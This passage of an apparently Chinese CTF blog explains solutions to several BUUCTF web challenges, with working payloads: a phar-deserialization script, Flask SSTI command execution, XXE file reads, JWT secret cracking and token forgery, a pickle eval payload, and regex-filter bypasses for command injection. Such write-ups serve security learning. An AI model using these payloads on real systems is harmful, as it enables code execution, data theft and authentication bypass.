&lt;title&gt;登录&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;登录&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt; &lt;p class=&quot;mt-5 text-muted&quot;&gt;还没有账号? &lt;a href=&quot;register.php&quot;&gt;注册&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;text-muted&quot;&gt;&amp;copy; 2018-2019&lt;/p&gt; &lt;/form&gt; &lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt; &lt;/body&gt; &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt; &lt;/html&gt; &lt;?php include &quot;class.php&quot;; if (isset($_GET['register'])) { echo &quot;&lt;script&gt;toast('注册成功', 'info');&lt;/script&gt;&quot;; } if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) { $u = new User(); $username = (string) $_POST[&quot;username&quot;]; $password = (string) $_POST[&quot;password&quot;]; if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) { $_SESSION['login'] = true; $_SESSION['username'] = htmlentities($username); $sandbox = &quot;uploads/&quot; . sha1($_SESSION['username'] . &quot;sftUahRiTz&quot;) . &quot;/&quot;; if (!is_dir($sandbox)) { mkdir($sandbox); } $_SESSION['sandbox'] = $sandbox; echo(&quot;&lt;script&gt;window.location.href='index.php';&lt;/script&gt;&quot;); die(); } echo &quot;&lt;script&gt;toast('账号或密码错误', 'warning');&lt;/script&gt;&quot;; } ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die(); } if (!isset($_POST['filename'])) { die(); } include &quot;class.php&quot;; chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response); } else { Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response); } ?&gt; delete.php单纯的文件删除功能，存在任意文件删除 download.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die(); } if (!isset($_POST['filename'])) { die(); } include &quot;class.php&quot;; ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;); chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) { Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close(); } else { echo &quot;File not exist&quot;; } ?&gt; download.php文件可以下载任意文件，但是限制了flag字符，所以不能下载flag文件 index.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die(); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;title&gt;网盘管理&lt;/title&gt; &lt;head&gt; &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;nav aria-label=&quot;breadcrumb&quot;&gt; &lt;ol class=&quot;breadcrumb&quot;&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt; &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;/nav&gt; &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt; &lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt; &lt;?php include &quot;class.php&quot;; $a = new FileList($_SESSION['sandbox']); $a-&gt;Name(); $a-&gt;Size(); ?&gt; upload.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die(); } include &quot;class.php&quot;; if (isset($_FILES[&quot;file&quot;])) { $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) { $filename = substr($filename, 0, $pos); } $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) { case 'image/gif': $fileext = &quot;.gif&quot;; break; case 'image/jpeg': $fileext = &quot;.jpg&quot;; break; case 'image/png': $fileext = &quot;.png&quot;; break; default: $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); die(); } if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) { $dst = $_SESSION['sandbox'] . $filename . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); } else { $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); } } ?&gt; upload.php限制了文件上传的类型，并且会根据content-type修改后缀 class.php &lt;?php error_reporting(0); $dbaddr = &quot;127.0.0.1&quot;; $dbuser = &quot;root&quot;; $dbpass = &quot;root&quot;; $dbname = &quot;dropbox&quot;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; } } class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); } } ?&gt; 可以看到File类中存在close方法，close方法会调用file_get_contents可以利用其读取flag文件，user类中的__destruct()又会调用close方法，__destruct()是魔术方法会在类的一个对象被删除时自动调用，至此已经可以读取到flag文件，但是还需要回显出来 BUUCTF [CISCN2019 华北赛区 Day1 Web1]Dropbox 1 由FileList对象销毁时自动调用的魔术方法 __destruct()实现，里面输出了$table变量，$table变量里有成员变量存有刚刚读出flag.txt的信息。 # 精简了下创建时自动调用的魔术方法__construct public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path);#返回我们上传文件的所有文件名 foreach ($filenames as $filename) { $file = new File(); array_push($this-&gt;files, $file);# 把File对象加入到files数组 $this-&gt;results[$file-&gt;name()] = array(); #results 是个数组，保存以我们上传的文件名作为键值，每个文件名键值映射一个数组。 （这个数组在__call方法里存放调用不存在的方法后的结果。） 具体看前文的__call方法代码的注释 } } $filename对应我们上传的文件名，$result（一维数组）对应文件下所有调用不存在方法的结果（即成员变量$results的第二维），$value对应单个结果的具体值。所以根据__add最后一行的$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();。$value可以存放读取flag.txt的结果。 phar伪协议引起的反序列化漏洞 构造好了利用链但是没有输入点，这里就可以使用phar伪协议，phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分，这部分还会以序列化的形式存储用户自定义的meta-data。 phar伪协议引起的反序列化漏洞利用条件： phar文件要能够上传到服务器端：如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且：、/、phar等特殊字符没有被过滤。 利用方法： 写一个生成phar的php文件，运行php文件生成phar.phar，修改后缀为jpg，上传到服务器，然后利用file_get_contents，使用phar://执行代码 脚本： &lt;?php class User { public $db; } class File { public $filename; } class FileList { private $files; private $results; private $funcs; public function __construct() { $file = new File(); $file-&gt;filename = '/flag.txt'; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); } } @unlink(&quot;phar.phar&quot;);#删除phar.phar $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new User(); $o-&gt;db = new FileList(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 上传文件，修改content-type 点击删除抓包，执行phar://代码，获得flag 因为要调用__construct() 所以只能用到删除功能 flag{6c22dd25-f7f0-4e16-9789-765987b748e9} 参考文章： 初探phar:// BUUCTF [CISCN2019 华北赛区 Day1 Web1]Dropbox 1 ","link":"https://scarecr0w7.github.io/post/ctforciscn2019-hua-bei-sai-qu-day1-web1dropbox/"},{"title":"WEB｜[GWCTF 2019]枯燥的抽奖","content":" 页面提示需要输入以lw1ar7AWmn开头的20位字符串才能获得flag，查看页面源码发现check.php 访问check.php，发现源码 伪随机数 mt_srand($_SESSION['seed']); $str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str=''; $len1=20; for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } 可以发现这里是使用mt_rand()来随机生成字符串，但是mt_rand()存在一个问题，同一个种子下随机生成的随机数值是相同的，只要获得了seed值就可以生成相同的字符串 CTF| web篇之伪随机数 mt_rand()存在的问题： 由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a，第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。 获取seed php_mt_seed可以根据一串int 或者一串由许多4个一组的数字组成的数据爆破出seed 根据已有字符串转换数据 php_mt_seed需要的是一串由许多4个一组的数字组成的数据，所以需要根据已有字符串进行转换 str1 = &quot;lw1ar7AWmn&quot; str2 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; length = 61 result = '' for i in range(0, len(str1)): for j in range(0, len(str2)): if str1[i] == str2[j]: result += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(length) + ' ' break print(result) 11 11 0 61 22 22 0 61 27 27 0 61 0 0 0 61 17 17 0 61 33 33 0 61 36 36 0 61 58 58 0 61 12 12 0 61 13 13 0 61 4个一组的数字格式 前面两个数是随机数的结果区间，后两位是随机数的随机范围区间，中间以一个空格为间隔 前面两个数是随机数的结果区间：str1在str2的位置，两位都一位 后两位是随机数的随机范围区间：str2的范围，每组都是一样，str2有62位，因为从0开始计数所以为61 爆破seed ./php_mt_seed 11 11 0 61 22 22 0 61 27 27 0 61 0 0 0 61 17 17 0 61 33 33 0 61 36 36 0 61 58 58 0 61 12 12 0 61 13 13 0 61 使用php_mt_seed爆破出seed为156489612 计算完整字符串 &lt;?php mt_srand(156489612); $str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str=''; $len1=20; for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } echo $str; ?&gt; 计算出20位完整字符串为lw1ar7AWmnI0Pp0fPEOC 获取flag flag{8f018bcf-6b8d-4228-b246-8cd0eaeb83d0} ","link":"https://scarecr0w7.github.io/post/ctforgwctf-2019ku-zao-de-chou-jiang/"},{"title":"WEB｜[CSCCTF 2019 Qual]FlaskLight","content":"查看网页源码提示GET方式传入search，结合网页内容显示有搜索内容和搜索结果处，应该是搜索内容然后显示，因为题目提示是flask想到flask模版的ssti 测试是否存在ssti {{5*4} 返回40说明存在ssti 解法一：基于config的payload 测试config，回显成功，说明没有过滤config，可以使用基于config的payload {{config.__init__['__globals__'].os.popen(&quot;whoami&quot;).read()}} 基于config的payload失败，前面测试了config没有过滤，应该globals被过滤了 拼接globals字符绕过 {{config.__init__['__glob'+'als__'].os.popen(&quot;whoami&quot;).read()}} 命令执行成功 查找flag文件，最终在/flasklight/coomme_geeeett_youur_flek中找到flag文件，读取flag文件 {{config.__init__['__glob'+'als__'].os.popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()}} flag{7b96ac57-d072-4808-b145-8719da96b14a} 解法一：查找可以使用的执行命的类 查看变量所属类 {{[].__class__}} 查看list所继承的基类 {{[].__class__.__base__}} 查看所有继承自object的类 {{[].__class__.__base__.__subclasses__()}} 在输出中寻找可以利用的类 不含os模块的类 这里以&lt;class '_weakrefset._IterationGuard'&gt;为例，它在继承自object的类第60位 不含os模块的类paylpad格式 # 60是第多少位，globals之后参数需要依次往下查找 {{[].__class__.__base__.__subclasses__()[60].__init__['__glo'+'bals__']['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;)}} __init__是类中的内置方法 __globals__是函数中的一个内置属性，以字典的形式返回当前空间的全局变量，而其中就能找到我们需要的目标模块&quot;builtins&quot;，并不是每个类的__init__都拥有__globals__属性 __builtins__模块有很多常用的内置函数和类，包括eval函数 eval函数将参数字符串当成python代码执行 __import__相当于import，区别在于__import__引入模块后我们可以直接使用符号&quot;.&quot;在引入带后面调用模块中的函数 popen函数返回结果是一个object，所以还需要read方法将结果读取出来 脚本测试适合的类 import requests import time for i in range(0,400): url=&quot;http://619a0672-e499-4e41-af4d-692a4159609b.node4.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()[%d].__init__['__glo'+'bals__']}}&quot; % (i) response=requests.get(url) if '{' in response.text: print(len(response.text),i,response.status_code) time.sleep(0.3) 含os模块的类 以&lt;class 'site._Printer'&gt;为例，它在继承自object的类第71位 含os模块的类paylpad格式 # 71是第多少位 {{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}} 含os模块的类的__init__函数全局变量中已经导入了&quot;os&quot;模块所以直接调用 ","link":"https://scarecr0w7.github.io/post/ctforcscctf-2019-qualflasklight/"},{"title":"WEB｜[NCTF2019]True XML cookbook","content":" 题目提示XML，直接抓包注入XML &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE lkj [ &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;user&gt; &lt;username&gt;&amp;admin;&lt;/username&gt; &lt;password&gt;1&lt;/password&gt; &lt;/user&gt; 读取失败 修改payload读取/etc/passwd文件成功说明payload没有问题，应该是没有flag文件或者不允许直接读取 读取当前doLogin.php文件源码 php://filter/convert.base64-encode/resource=doLogin.php base64解码得到源码，密码可以解密出来但是登录失败，这里也没有关于flag的信息，所以应该不是这个方向 &lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = 'admin'; //账号 $PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); }else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); } }catch(Exception $e){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); } header('Content-Type: text/html; charset=utf-8'); echo $result; ?&gt; 读取hosts文件看是否有ip信息，也没有 看了其他wp是读取/proc/net/arp，发现存在内网主机10.128.253.12 IP address HW type Flags HW address Mask Device 192.168.1.151 0x1 0x2 00:e0:4c:19:1a:98 * eth0 192.168.1.1 0x1 0x2 00:14:78:e7:c4:e8 * eth0 每个网络接口的arp表中dev包的统计 IP address：IP地址（直连） HW type：硬件类型 23=0x17 strip (Metricom Starmode IP) 01=0x01 ether (Ethernet) 15=0xf dlci (Frame Relay DLCI) Flags： HW address：MAC 地址 Mask： Device：所在网络接口 内网探测常见文件 /etc/hosts /proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev /proc/net/fib_trie 访问10.128.253.12，失败 爆破下内网地址，全部失败，看了别人的wp说是需要看/proc/net/fib_trie，得到10.244.80.213 由于BUUCTF转用了K8S管理，他的靶机容器是随机在80，81两个网段里的 具体情况看/proc/net/fib_trie 继续访问10.244.80.213，失败继续爆破 最终在10.244.80.116找到flag flag{d6fcfdff-5d3c-461c-944c-ce4f091af9e7} ","link":"https://scarecr0w7.github.io/post/ctfornctf2019true-xml-cookbook/"},{"title":"WEB｜[Zer0pts2020]Can you guess it?","content":" 源码 &lt;?php include 'config.php'; // FLAG is defined in config.php if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; } } 源码分析 if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;); } 访问路径不能以/config.php/结尾 $_SERVER['PHP_SELF'])：当前正在执行脚本的文件名；PHP中$_SERVER的详细用法 http://123.com/index.php --&gt; index.php http://123.com/index.php/config.php --&gt; config.php if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } GET方法获取到source参数就显示显示文件内容，这里使用basename()存在漏洞，代码提示flag在config.php文件，可以利用这里查看config.php文件 basename()：返回路径中的文件名部分 basename() 在使用默认语言环境设置时，会删除文件名开头的非 ASCII 字符，%ff、%2b、%0d等，中文内容也可以：汉字、？、《、》、；等 $secret = bin2hex(random_bytes(64)); if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } 随机生成字符并转为16进制，POST方式获取guess，guess值与secret值相比较，如果相等显示flag，但是这里使用的是hash_equals避免了时序攻击和 php 弱类型，无法利用 hash_equals()：用于同时比较两个字符串是否相等，无论字符串是否相等，函数的时间消耗是恒定的，可以有效的防止时序攻击 解法 利用basename()读取config.php的内容，$_SERVER['PHP_SELF']就要等于config.php，但是preg_match禁止以config.php结尾，这里就利用到了basename()漏洞加字符绕过 payload /index.php/config.php/字?source 这里/index.php/config.php，虽然$_SERVER['PHP_SELF']获取的值等于config.php，但是浏览器可以解析为index.php从而正常显示页面 构造请求，得到flag flag{e8b0c7d6-f24c-4227-9e4e-445dfea96b22} ","link":"https://scarecr0w7.github.io/post/ctforzer0pts2020can-you-guess-it/"},{"title":"WEB｜[CISCN2019 华北赛区 Day1 Web2]ikun","content":" 访问页面注册帐户登录，提示要买到lv6，翻了好几页发现没得lv6的商品，写个脚本跑看看lv6商品在第几页 import requests i = 0 while True: i += 1 url = 'http://40902fee-e0e5-4d7a-8b38-b16b5f97549b.node4.buuoj.cn:81/shop?page=%d' % (i) print(url) res = requests.get(url) if (res.status_code == 200) &amp; ('lv6.png' in res.text): break print(i) 在第181页找到lv6商品 但是lv6需要1145141919.0，帐户中只有10，抓包试试改价格，最终失败；修改折扣，也失败 在修改折扣后跳出来一个地址，访问一下，只允许admin访问 但是在header看到cookie中有个JWT，证明身份验证采用的是JWT，则可以爆破密匙然后解析JWT Cookie: _xsrf=2|33888dbf|67745a3bbfbeb269b184a0a2d045e69d|1660383167; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78 爆破JWT密匙 这里使用的是brendan-rius/c-jwt-cracker ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78 Secret is &quot;1Kun&quot; 解析JWT 使用密匙去解析网站jwt.io伪造admin身份，得到admin的JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 修改cookie的JWT发包，点击一键成为大会员，并没有什么反应。 但是在网页源码中显示出了备份文件的网址，下载备份文件 python反序列化漏洞 become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) 在/www/sshop/views/Admin.py文件中使用了pickle模块，并且become参数可控，所以存在反序列化漏洞 通过重写__reduce__()魔法方法读取flag文件，reduce()魔法方法是当对象被Pickle时就会被调用 import pickle import urllib class payload(object): def __reduce__(self): return (eval, (&quot;open('/flag.txt','r').read()&quot;,)) a = pickle.dumps(payload()) a = urllib.quote(a) print a 添加参数发送请求，得到flag flag{e1f91f72-ffb2-4e96-b7e5-e705abd4091a} ","link":"https://scarecr0w7.github.io/post/ctforciscn2019-hua-bei-sai-qu-day1-web2ikun/"},{"title":"WEB｜[FBCTF2019]RCEService","content":" 页面提示输入json格式的命令 {&quot;cmd&quot;: &quot;ls&quot;} 输入ls命令查看当前目录文件，当前目录仅有index.php文件 读取index.php文件，发现被检测到 {&quot;cmd&quot;: &quot;cat ./index.php&quot;} 经过测试发现很多命令和符号都被过滤，自己是没有做出来，在看别人的wp时发现他们不知道从哪里找到的源码 源码 &lt;?php putenv('PATH=/home/rceservice/jail'); if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; } } ?&gt; 源码显示当前环境为/home/rceservice/jail，并且preg_match过滤了很多东西 解法一 因为这里用的是preg_match进行匹配，preg_match匹配有一个问题就是preg_match只能匹配第一行的数据，所以可以使用换行符绕过 因为putenv('PATH=/home/rceservice/jail');修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在/bin文件夹下 Linux命令的位置： /bin，/usr/bin，默认都是全体用户使用；/sbin，/usr/sbin默认root用户使用 payload {%0A&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0A} 在/home/rceservice下发现flag文件 {%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A} 读取flag文件，得到flag flag{879b70ce-39e2-4dd6-9852-2cd81be36051} 解法二 来自PHITHON的PHP利用PCRE回溯次数限制绕过某些安全限制，通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。 PCRE回溯的方法解题，需要用POST发送请求，因为GET会因为头太大报错。 上面使用ls找到了flag的位置，然后使用以下脚本读取flag文件 import requests payload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}' res = requests.post(&quot;http://16db7a43-30ad-49d7-b3f3-dce880bd5aec.node4.buuoj.cn:81/&quot;, data={&quot;cmd&quot;:payload}) print(res.text) 